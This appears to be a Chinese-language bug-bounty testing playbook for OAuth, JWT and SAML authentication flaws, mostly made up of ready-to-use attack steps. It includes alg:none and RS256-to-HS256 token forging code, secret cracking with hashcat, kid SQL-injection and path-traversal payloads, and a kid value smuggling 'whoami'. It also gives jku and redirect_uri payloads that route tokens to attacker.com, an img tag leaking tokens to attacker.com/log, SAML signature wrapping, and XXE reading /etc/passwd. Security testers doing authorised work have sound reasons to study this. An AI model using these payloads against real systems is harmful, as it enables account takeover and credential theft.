---
phase: webapp
vuln_class: [jwt, oauth, auth]
title: OAuth / JWT / SAML 认证安全测试
summary: JWT 看头部字段信任（alg/kid/jku/x5u），OAuth 看回调与状态绑定（redirect_uri/state/PKCE），SAML 看签名覆盖哪一段 XML。
---

> 跨域读 token：SRC 不挖 CORS，**勿开** `web/漏洞分类/跨域配置错误/CORS 技术资料（SRC 禁用）.md`。有跨站写走 `web/漏洞分类/跨站请求伪造/CSRF.md`，有越权读走 `web/漏洞分类/越权/越权漏洞（IDOR-权限绕过）.md`。
>
> 用户给的会话禁止调 logout，不测「退出后会话还在」。自己注册/匿名建的测试号可以测退出后票是否失效。

# OAuth、JWT、SAML 认证安全测试

## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| token 三段 base64，header 有 `alg` | JWT | 先解头部，看信任哪些字段 |
| `alg:none` 被接受（尾部只留 `.`） | 未强制校验算法 | 直接改 payload 重签 |
| RS256 站点能拿到公钥 | 算法混淆候选 | 用 PEM 公钥当 HMAC 密钥签 HS256 |
| `kid` 出现在头部 | 键查找可控 | SQL 注入 / 路径穿越读空文件 |
| `jku` / `x5u` 可控 | 远端取键 | 指向自己的 jwks.json |
| HS256 + 弱口令 | 可离线爆破 | hashcat `-m 16500` |
| `redirect_uri` 白名单是前缀匹配 | 绕过 | `callbackXSS`、`callback/../`、`target.com@attacker.com` |
| 授权请求无 `state` 或可预测 | CSRF 绑定 | 把受害者会话绑到攻击者身份 |
| `code` 能换第二次 | 授权码未单次化 | 重放 |
| 换 token 时能加 `scope` | scope 未与 code 绑定 | 提权 |
| 隐式流 token 在 `#fragment` | 前端可取 | 找开放重定向或 Referer 泄漏 |
| SAML 响应里能插第二个 Assertion | 签名节点 ≠ 业务节点 | XML 签名包装 |
| SAML 断言被接受但没验签 | 未强制签名 | 直接改 NameID / Attribute |

---

## 1. JWT 结构速记

```text
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJ1c2VyIjoiYWRtaW4ifQ . <sig>
{"alg":"HS256","typ":"JWT"}            {"user":"admin"}
```

```bash
# 拆开看
python3 -c "import base64,sys,json
for p in sys.argv[1].split('.')[:2]:
    print(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))))" '<JWT>'
```

头部高价值字段：`alg`、`kid`、`jku`、`x5u`、`typ`、`cty`。
payload 高价值字段：`role`、`isAdmin`、`org`、`tenant`、`scope`、`aud`、`iss`、`exp`。

**先做的四件事**：解头部 → 看算法 → 看有没有 `kid/jku/x5u` → 看 payload 里能改什么权限字段。

---

## 2. JWT 攻击族

### 2.1 alg:none

服务端若用 `alg` 头决定校验方式，而 `none` 未被拒，等于无签名。

```python
import base64, json

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip('=')

fake = b64({"alg": "none", "typ": "JWT"}) + "." + b64({"user": "admin", "role": "admin"}) + "."
```

变体要都试：`none`、`None`、`NONE`、`nOnE`（大小写敏感的实现差异），以及尾部**保留一个点**和**完全不写点**两种形态。

### 2.2 RS256 → HS256 密钥混淆

非对称验签的实现若信任 `alg`，把算法改成 HS256 后它会拿**公钥**当 HMAC 密钥。

```python
import jwt
public_key = open('public.pem', 'rb').read()
fake = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

公钥来源：`/.well-known/jwks.json`（转 PEM）、`/certs`、HTTPS 证书里的公钥、源码/仓库泄漏。

```bash
# jwks.json → PEM
python3 -c "
import json,sys
from jwcrypto import jwk
k=jwk.JWK(**json.load(open('jwks.json'))['keys'][0])
open('public.pem','w').write(k.export_to_pem().decode())"
```

**坑**：HMAC 的密钥是**整个 PEM 文件字节**（含 `-----BEGIN PUBLIC KEY-----` 与换行），不是裸模数。

### 2.3 弱密钥爆破

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt        # 最快
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

字典优先：`rockyou` + 项目名/公司名/域名变体 + 常见弱口令（`secret`、`changeme`、`your-256-bit-secret`、Spring 示例默认值）。

### 2.4 kid 注入

`kid` 是"用哪把钥匙"的标识，实现常直接拼进查询或路径。

```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
```text
后端: SELECT key FROM keys WHERE kid = '<INPUT>'
结果: HMAC 密钥 = attacker_controlled_key → 可签任意 payload
```

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
```text
服务端把 /dev/null 内容（空串）当密钥 → 用空 HMAC 密钥签名
```

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
```text
服务端把 hostname 当密钥 → 用主机名签名（主机名常可猜）
```

```json
{"alg":"HS256","kid":"key.txt; whoami"}
```

### 2.5 jku / x5u 远端取键

`jku` 指向 JWK Set URL，`x5u` 指向证书 URL。若实现无白名单就去拉，等于让攻击者提供验签公钥。

```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker-key"}
```

```json
{"keys":[{"kty":"RSA","kid":"attacker-key","use":"sig","n":"<攻击者公钥模数>","e":"AQAB"}]}
```

用自己的私钥签 JWT，服务端拉取我们的 JWKS 验签 → 通过。

**绕过白名单的常见花招**：`https://target.com@attacker.com/jwks.json`、`https://attacker.com/target.com`、`https://target.com.attacker.com`、`http://` 而非 `https://`、URL 里带 `#`/`?` 截断。

### 2.6 签名剥离 / exp 篡改

```text
原始: header.payload.c2lnbmF0dXJl...
剥离: header.payload.          ← 部分实现不检查签名段是否存在
```

`exp` 篡改只在**签名不被验**时有效；一旦能改 `exp` 说明前面几族已成立，别单列成一条漏洞。

---

## 3. OAuth 2.0 攻击族

### 3.1 redirect_uri 绕过

```text
原始: https://oauth.target.com/authorize?client_id=X&redirect_uri=https://target.com/callback&response_type=code&scope=read

子目录穿越:  redirect_uri=https://target.com/callback/../../attacker.com
子域名:      redirect_uri=https://attacker.target.com/callback
参数污染:    redirect_uri=https://target.com/callback?next=https://attacker.com
开放重定向链: redirect_uri=https://target.com/redirect?url=https://attacker.com
域名混淆:    redirect_uri=https://target.com.attacker.com
             redirect_uri=https://target.com@attacker.com
             redirect_uri=https://target.com%2eattacker.com
协议混淆:    redirect_uri=javascript:alert(document.domain)
             redirect_uri=data:text/html,<script>alert(1)</script>
前缀匹配:    redirect_uri=https://target.com/callbackXSS
路径混淆:    redirect_uri=https://target.com/callback%2f../admin
本地残留:    redirect_uri=http://localhost/steal
移动端:      redirect_uri=urn:ietf:wg:oauth:2.0:oob
```

判据：白名单是**精确字符串比较**还是 `startsWith`/`contains`。后者全部可绕。

### 3.2 state 缺失 → 账号绑定劫持

```text
1. 点"用 Google 登录" → 拦下授权 URL
2. 拿到自己的 code（先不换 token）
3. 构造 https://target.com/oauth/callback?code=ATTACKER_CODE
4. 受害者点开 → 他的会话绑到攻击者的 OAuth 身份
→ 账号接管
```

`state` 三种缺陷：**缺失**、**可预测**（递增/时间戳）、**不绑定会话**（任意 state 都收）。第三种最隐蔽——有 state 但不校验归属，等于没有。

### 3.3 授权码重放

```bash
curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

`code` 必须单次有效。第二次仍返回 token → 可重放。

### 3.4 scope 提升

```bash
# 授权时只申请 read，换 token 时偷偷加
curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"
```

判据：**服务端按"请求的 scope"发还是按"code 里记的 scope"发**。后者才对。

### 3.5 隐式流 token 泄漏

```text
https://target.com/callback#access_token=TOKEN&token_type=Bearer
```

三条泄漏路径：

1. **Referer** —— 回调页加载第三方资源，`Referer` 带 `#fragment`（部分浏览器会把 fragment 带进 Referer）：

   ```html
   <img src="https://attacker.com/log">
   ```

2. **开放重定向** —— `redirect_uri=https://target.com/open-redirect?url=https://attacker.com`，fragment 落到攻击者页。
3. **浏览器历史 / 代理日志** —— fragment 不进服务端日志，但进浏览器历史和部分中间设备。

### 3.6 PKCE 未强制

```text
1. 授权请求不带 code_challenge
2. 换 token 时不带 code_verifier
3. 仍能成功 → 未强制 PKCE
```

公共客户端（SPA、移动端）缺 PKCE，等于授权码可被截。

### 3.7 client_secret 泄漏

```bash
grep -r "client_secret" *.js
grep -r "clientSecret" *.js
apktool d app.apk && grep -r "client_secret" app/
git log -p | grep -i "client_secret"
```

### 3.8 OIDC 专项

| 检查项 | 缺陷表现 |
|---|---|
| `nonce` | ID token 回来时不校验 nonce → 重放 |
| `aud` | 不校验或只校验存在性 → 跨 client 复用 token |
| `iss` | 不校验 → 拿别家 IdP 的 token 冒充 |
| 账号绑定 | 仅按 email 绑定、大小写折叠、未验 `email_verified` |
| provider 混淆 | 期望 Google 的入口接受 Apple ID |

### 3.9 token 泄漏面

```text
# query 参数里的 token 会进日志
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

判据：token 在 `Authorization` 头 > 在 Cookie（`HttpOnly`）> 在 query > 在 fragment。

---

## 4. SAML 攻击族

### 4.1 签名包装（XSW）

签名只覆盖**某一个** Assertion 节点；业务逻辑读**另一个**。

```xml
<!-- 原始 -->
<samlp:Response>
  <Assertion ID="original">
    <Subject><NameID>victim@example.com</NameID></Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 攻击：把自己插到前面，签名仍盖着原节点 -->
<samlp:Response>
  <Assertion ID="evil">
    <Subject><NameID>attacker@example.com</NameID></Subject>
  </Assertion>
  <Assertion ID="original">
    <Subject><NameID>victim@example.com</NameID></Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>
```

**应用读第一个 Assertion 但验第二个的签名** → 绕过。变体很多（把签名节点搬进恶意 Assertion 的 `Extensions`、用 `ID` 重复值让 XPath 选错节点），工具 SAML Raider 一次跑完。

### 4.2 断言篡改（未强制验签时）

```xml
<NameID>admin@example.com</NameID>

<Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>

<Conditions NotBefore="2020-01-01" NotOnOrAfter="2030-01-01">
```

### 4.3 XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<samlp:AuthnRequest><Issuer>&xxe;</Issuer></samlp:AuthnRequest>
```

### 4.4 注释截断

```xml
<NameID>victim@example.com<!--</NameID>
<NameID>attacker@example.com</NameID>-->
```

解析器忽略注释，签名计算却可能包含注释文本，两边对不上时行为差异可被利用。

### 4.5 SAML 检查项

| 检查项 | 缺陷表现 |
|---|---|
| 签名验证 | 接受未签名断言、签错节点、包装攻击 |
| `Audience` / `Recipient` / `Destination` | 不校验或弱校验 → 断言跨 SP 复用 |
| `Issuer` 信任 | 接受错误 IdP、多租户 issuer 混淆 |
| 重放与新鲜度 | 缺 `InResponseTo`、`NotBefore`/`NotOnOrAfter` 不生效 |
| 账号映射 | 仅 email 绑定、大小写折叠、属性未验证 |
| XML 解析器 | XXE、不安全 transform |

---

## 5. 认证面杂项

### 5.1 批量赋值字段

```text
role  isAdmin  admin  verified  plan  tier  permissions  org  owner
```

注册、改资料、邀请成员等接口，逐个塞进请求体看是否被采纳。

### 5.2 限速绕过

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
User-Agent 轮换
路径大小写/斜杠变体
```

### 5.3 批量与 GraphQL

- login mutation 数组
- 同一请求里带多个不同 ID 的对象读取
- 一次请求里重复触发密码重置/验证码

---

## 6. 工具

```bash
# jwt_tool
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT> -M at              # 全量扫描
python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破密钥
python3 jwt_tool.py <JWT> -T                 # 交互式篡改
```

Burp 插件：**JWT4B / JWT Editor**、**SAML Raider**、OAuth Scanner。

---

## 7. 检查清单

**JWT**

```text
□ 解 header + payload（base64）
□ 认算法：HS256 / RS256 / ES256 / none
□ alg:none（大小写变体 + 有点/无点）
□ RS256 → HS256 混淆（用 PEM 全字节当密钥）
□ HS256 弱密钥爆破（hashcat -m 16500）
□ kid：SQL 注入 / 路径穿越（/dev/null、/etc/hostname）
□ jku / x5u：指向自己的 JWKS，含白名单绕过花招
□ 改 payload 权限字段
□ exp 是否被校验
□ token 在 query 还是 header（日志泄漏面）
```

**OAuth / OIDC**

```text
□ 授权请求有无 state；state 是否绑定会话
□ redirect_uri：前缀匹配 / 子域 / @ / %2e / 路径穿越 / javascript: / localhost 残留
□ code 能否换第二次
□ 换 token 时能否加 scope
□ 隐式流：Referer、开放重定向链
□ PKCE：code_challenge 可省？code_verifier 可空？
□ nonce / aud / iss 是否校验
□ 账号绑定：同 email 能否抢占、provider 能否混淆
□ SPA / 移动端 / Web 三端校验强度差异
```

**SAML**

```text
□ 完整抓一次登录往返（SP-initiated 与 IdP-initiated 都抓）
□ 确认签的是哪个 XML 节点，业务读的是哪个
□ 签名包装：插前置 Assertion / 重复 ID / 搬进 Extensions
□ 未签名断言是否被接受
□ Audience / Recipient / Destination 校验
□ InResponseTo / NotBefore / NotOnOrAfter 是否生效
□ 属性驱动账号映射（role、email）
□ XXE 与注释截断
```

---

## 8. 纪律

1. **先解头部再动手**。没有 `kid`/`jku`/`x5u` 的 token，那三族直接跳过，别浪费轮次。
2. **`alg:none` 一定要试大小写与尾点变体**，只试一种会误判为"不支持"。
3. **RS256 混淆的密钥是整个 PEM 字节**，用裸模数签名必然失败，别因此判定"不存在混淆"。
4. **`state` 有值不等于安全**。必须验证它是否绑定当前会话，否则照样能打绑定劫持。
5. **`redirect_uri` 精确比较才算修好**，`startsWith` 一律视为可绕。
6. **SAML 只测签名覆盖范围，不猜业务逻辑**。先问"签的是哪个节点、读的是哪个节点"。
7. **用户给的会话禁止调 logout**；退出后票失效只在自建测试号上测。
8. **跨域读 token 不挖 CORS**（SRC 口径），本页只到"token 在哪里泄漏"为止。
9. 报告只认 `rules/vuln-report-format.md`。
